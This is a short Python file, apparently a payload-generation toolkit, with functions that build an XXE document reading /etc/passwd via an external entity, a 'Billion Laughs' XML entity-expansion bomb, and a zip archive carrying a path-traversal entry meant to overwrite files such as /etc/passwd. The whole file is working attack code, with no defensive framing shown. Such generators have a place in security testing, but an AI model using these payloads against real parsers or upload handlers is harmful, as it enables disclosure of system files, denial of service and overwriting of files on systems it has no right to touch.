import os
import zipfile
import logging

# --- Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- XML Generators ---

def generate_xxe_xml(file_to_read="/etc/passwd"):
    """Generates an XML payload for a classic XXE attack."""
    return f"""<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file://{file_to_read}">
]>
<foo>&xxe;</foo>
"""

def generate_billion_laughs_xml():
    """Generates a 'Billion Laughs' XML bomb."""
    return """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
"""

# --- Archive Generators ---

def generate_zip_traversal(output_filename, target_path, content="hacked"):
    """
    Generates a Zip file with a path traversal payload.

    Args:
        output_filename (str): The name of the zip file to create.
        target_path (str): The path for the malicious file inside the zip,
                           e.g., '../../../../../../../../etc/passwd'.
        content (str): The content to write into the malicious file.
    """
    try:
        with zipfile.ZipFile(output_filename, 'w') as zf:
            zf.writestr(target_path, content)
        logging.info(f"Successfully created zip traversal file: {output_filename}")
        return True
    except Exception as e:
        logging.error(f"Failed to create zip traversal file: {e}")
        return False